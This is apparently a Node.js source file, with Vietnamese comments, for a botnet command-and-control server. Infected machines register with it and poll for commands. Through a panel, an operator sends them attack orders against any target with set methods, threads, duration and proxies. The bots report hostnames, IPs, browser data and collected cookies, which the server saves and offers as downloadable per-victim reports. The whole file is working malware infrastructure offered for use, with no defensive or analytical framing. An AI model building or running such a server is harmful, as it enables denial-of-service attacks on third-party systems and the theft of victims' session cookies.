const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);

app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));
app.use('/methods', express.static('methods'));

// ===== DỮ LIỆU =====
let bots = {};
let pendingCommands = {};
let attackLog = [];
let infoData = {}; // Lưu thông tin bot báo cáo về

// ===== DỌN BOT CHẾT (QUÁ 15 GIÂY KHÔNG CHECK) =====
setInterval(() => {
    let now = new Date();
    for (let id in bots) {
        if ((now - new Date(bots[id].lastSeen)) > 15000) {
            delete bots[id];
            delete infoData[id];
            console.log('Bot timeout:', id);
        }
    }
}, 10000);

// ===== BOT ĐĂNG KÝ =====
app.post('/api/register', (req, res) => {
    const { id, hostname, ip } = req.body;
    
    // Kiểm tra bot cũ cùng hostname → xóa bot cũ
    for (let oldId in bots) {
        if (bots[oldId].hostname === hostname && oldId !== id) {
            delete bots[oldId];
            delete infoData[oldId];
        }
    }
    
    bots[id] = {
        id: id,
        hostname: hostname || 'Unknown',
        ip: ip || req.ip,
        online: true,
        status: 'ONLINE',
        target: '',
        method: '',
        cpu: 0,
        ram: 0,
        gpu: 'Unknown',
        cookies: '',
        lastSeen: new Date()
    };
    console.log('Bot registered:', hostname, id);
    res.json({ ok: true });
});

// ===== BOT CHECK LỆNH =====
app.post('/api/check', (req, res) => {
    const { id } = req.body;
    
    if (bots[id]) {
        bots[id].lastSeen = new Date();
        bots[id].online = true;
    }
    
    let cmd = pendingCommands['ALL'] || pendingCommands[id] || null;
    if (cmd) {
        delete pendingCommands['ALL'];
        delete pendingCommands[id];
    }
    
    res.json(cmd || { action: 'none' });
});

// ===== BOT BÁO CÁO TRẠNG THÁI =====
app.post('/api/report', (req, res) => {
    const { id, status, target, method } = req.body;
    if (bots[id]) {
        bots[id].status = status || 'ONLINE';
        bots[id].target = target || '';
        bots[id].method = method || '';
        bots[id].lastSeen = new Date();
    }
    attackLog.push({ id, status, target, method, time: new Date() });
    res.json({ ok: true });
});

// ===== BOT BÁO CÁO THÔNG TIN HỆ THỐNG =====
app.post('/api/reportinfo', (req, res) => {
    const { id, cpu, ram, gpu, cookies, browsers } = req.body;
    if (bots[id]) {
        bots[id].cpu = cpu || 0;
        bots[id].ram = ram || 0;
        bots[id].gpu = gpu || 'Unknown';
        bots[id].cookies = cookies || '';
        bots[id].browsers = browsers || '';
        bots[id].lastSeen = new Date();
    }
    infoData[id] = { id, cpu, ram, gpu, cookies, browsers, time: new Date().toISOString() };
    res.json({ ok: true });
});

// ===== PANEL GỬI LỆNH TẤN CÔNG =====
app.post('/api/attack', (req, res) => {
    const { botId, method, target, threads, duration, proxyFile } = req.body;
    
    const cmd = {
        action: 'attack',
        method: method,
        target: target,
        threads: parseInt(threads) || 100,
        duration: parseInt(duration) || 60,
        proxyFile: proxyFile || ''
    };
    
    if (botId === 'ALL') {
        pendingCommands['ALL'] = cmd;
    } else if (botId) {
        pendingCommands[botId] = cmd;
    }
    
    attackLog.push({ botId, ...cmd, time: new Date() });
    res.json({ ok: true, cmd: cmd });
});

// ===== PANEL DỪNG TẤN CÔNG =====
app.post('/api/stop', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') {
        pendingCommands['ALL'] = { action: 'stop' };
    } else if (botId) {
        pendingCommands[botId] = { action: 'stop' };
    }
    res.json({ ok: true });
});

// ===== LẤY THÔNG TIN BOT =====
app.post('/api/getinfo', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') {
        pendingCommands['ALL'] = { action: 'getinfo' };
    } else if (botId) {
        pendingCommands[botId] = { action: 'getinfo' };
    }
    res.json({ ok: true });
});

// ===== TẢI FILE THÔNG TIN BOT (.TXT) =====
app.get('/api/downloadinfo/:id', (req, res) => {
    const id = req.params.id;
    const bot = bots[id];
    const info = infoData[id] || {};
    
    if (!bot) return res.status(404).send('Bot not found');
    
    let txt = `╔══════════════════════════════════════╗\n`;
    txt += `║     BOT INFORMATION REPORT           ║\n`;
    txt += `╚══════════════════════════════════════╝\n\n`;
    txt += `Bot ID:        ${id}\n`;
    txt += `Hostname:      ${bot.hostname}\n`;
    txt += `IP Address:    ${bot.ip}\n`;
    txt += `Status:        ${bot.status}\n`;
    txt += `Last Seen:     ${bot.lastSeen}\n`;
    txt += `\n─── SYSTEM INFO ───\n`;
    txt += `CPU:           ${info.cpu || 'N/A'}%\n`;
    txt += `RAM:           ${info.ram || 'N/A'}%\n`;
    txt += `GPU:           ${info.gpu || 'N/A'}\n`;
    txt += `\n─── BROWSER DATA ───\n`;
    txt += `Browsers:      ${info.browsers || 'N/A'}\n`;
    txt += `\n─── COOKIES ───\n`;
    txt += `${info.cookies || 'No cookies collected'}\n`;
    txt += `\n─── TIMESTAMP ───\n`;
    txt += `Report Time:   ${info.time || 'N/A'}\n`;
    
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', `attachment; filename=bot_${bot.hostname}_${id.substring(0,8)}.txt`);
    res.send(txt);
});

// ===== XEM DANH SÁCH BOT =====
app.get('/api/bots', (req, res) => {
    // Chỉ trả về bot còn online
    let online = {};
    for (let id in bots) {
        if (bots[id].online) online[id] = bots[id];
    }
    res.json(online);
});

// ===== XEM DANH SÁCH METHODS =====
app.get('/api/methods', (req, res) => {
    let files = fs.readdirSync('./methods');
    res.json(files);
});

// ===== PANEL HTML =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'panel.html'));
});

// ===== START =====
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log('C2 Server running on port ' + PORT);
});
